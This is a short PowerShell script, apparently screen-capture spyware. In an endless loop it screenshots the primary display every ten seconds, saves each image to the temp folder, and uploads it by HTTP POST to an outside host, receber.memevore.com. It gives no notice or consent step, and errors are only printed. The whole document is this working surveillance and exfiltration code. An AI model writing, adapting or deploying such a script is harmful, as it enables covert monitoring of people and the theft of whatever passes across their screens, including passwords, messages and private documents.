# CONFIG
$uploadUrl = "https://receber.memevore.com/upload"
$intervalSeconds = 10

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

while ($true) {
    try {
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        
        $tempPath = "$env:TEMP\screenshot.png"
        $bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)

        Invoke-WebRequest -Uri $uploadUrl -Method Post -Form @{file=Get-Item $tempPath} -UseBasicParsing | Out-Null
    } catch {
        Write-Host "Erro ao capturar/enviar screenshot: $_"
    }

    Start-Sleep -Seconds $intervalSeconds
}
